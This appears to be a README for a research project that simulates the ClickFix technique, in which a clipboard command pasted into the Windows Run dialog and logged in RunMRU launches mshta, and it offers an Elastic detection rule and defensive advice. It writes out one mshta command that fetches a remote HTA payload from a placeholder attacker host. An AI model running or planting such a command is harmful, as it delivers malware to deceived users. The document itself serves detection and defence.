# 📄 ClickFix-Style RunMRU → mshta Execution Attack Simulation

## 🔥 Overview

This project demonstrates a **ClickFix-style execution technique** used by malware families such as **Lumma Stealer**, where attackers trick users into executing a malicious command placed in the Windows Run dialog (Win+R).

The simulation replicates:

1. **Clipboard manipulation** – attacker places a malicious `mshta.exe` payload into the user's clipboard.
2. **RunMRU registry injection** – entry added to `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` so it appears as a recently-used command.
3. **Execution via mshta.exe** – payload HTA file is executed.

This chain relies heavily on **social engineering**, bypassing traditional autorun methods.

---

## 🛠 Attack Script Behavior

The PowerShell simulation performs:

- Copies command: `"C:\Windows\System32\mshta.exe" http://<attacker-ip>/hello6.hta`
- Inserts a RunMRU entry with timestamp
- Prepends it into MRUList
- Waits and executes mshta.exe to retrieve the HTA payload

This replicates what real-world campaigns use to make execution "look" user-initiated.

---

## 🧪 Detection (Elastic / Sysmon)

This repo includes an **Elastic EQL correlation rule** that alerts only when:

1. RunMRU registry entry is created
2. Followed by `mshta.exe` execution
3. Within **30 seconds**
4. Same host + same user

**Sysmon events used:**

- **Event ID 13** — RegistryEvent
- - **Event ID 24** — ClipBoard Monitoring
- **Event ID 1 / 3** — Process & Network events

This creates a **high-confidence detection** with minimal false positives.

---

## ⚠️ Disclaimer

**This project is for educational, research, and detection-engineering purposes only.**

Do NOT use in production systems without authorization.

---


## 📊 Attack Flow

```
User visits malicious site
         ↓
Clipboard hijacked with mshta command
         ↓
User presses Win+R and pastes
         ↓
RunMRU registry entry created
         ↓
mshta.exe executes remote HTA payload
         ↓
Malware deployed
```

---

## 🛡️ Defense Recommendations

- Monitor RunMRU registry keys for suspicious entries
- Block or restrict `mshta.exe` execution via AppLocker/WDAC
- Enable Sysmon with registry monitoring
- Deploy behavioral detection rules (like the included EQL rule)
- Train users to recognize social engineering tactics

---

## 📜 License

MIT License - See LICENSE file for details

---

## 🤝 Contributing

Pull requests welcome! Please open an issue first to discuss proposed changes.

---

## 📧 Contact

For questions or collaboration: [@CyberFreak01]

---

**⭐ If you find this useful, please star the repo!**